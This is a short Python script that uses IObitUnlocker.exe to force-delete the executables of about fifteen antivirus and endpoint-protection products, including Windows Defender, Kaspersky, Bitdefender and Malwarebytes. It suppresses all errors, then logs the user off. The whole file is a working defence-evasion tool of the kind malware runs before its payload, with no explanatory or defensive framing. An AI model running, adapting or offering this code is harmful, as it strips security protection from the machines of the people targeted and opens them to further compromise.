import subprocess, time

rkoff = 'off\\IObitUnlocker.exe' 
wDF = ['C:\\Program Files\\Windows Defender\\MsMpEng.exe',
 'C:\\Program Files\\Windows Defender\\MpCmdRun.exe',
 'C:\\Program Files\\Avast Software\\Avast\\avast.exe', 
 'C:\\Program Files\\AVG\\AVG\\avgui.exe', 
 'C:\\Program Files\\AVG\\AVG\\avgsvc.exe', 
 'C:\\Program Files\\McAfee\\Total Protection\\McUICnt.exe',
 'C:\\Program Files\\Kaspersky Lab\\Kaspersky Internet Security\\avp.exe',
 'C:\\Program Files\\Bitdefender\\Bitdefender\\bdservicehost.exe',
 'C:\\Program Files\\Panda Security\\Panda Global Protection\\panda.exe',
 'C:\\Program Files\\ESET\\ESET Security\\egui.exe', 
 'C:\\Program Files\\Sophos\\Sophos Anti-Virus\\SavService.exe',
 'C:\\Program Files\\Webroot\\WRSA.exe',
 'C:\\Program Files\\Malwarebytes\\Anti-Malware\\mbam.exe',
 'C:\\Program Files\\F-Secure\\F-Secure\\fsav.exe',
 'C:\\Program Files\\Comodo\\Comodo Antivirus\\cmdagent.exe']

for i in wDF:
	off = f'{rkoff} /Delete "{i}"'
	try:
		subprocess.Popen(off, shell=True)
	except:
		pass

time.sleep(10)
close = 'shutdown /l'
subprocess.run(close, shell=True)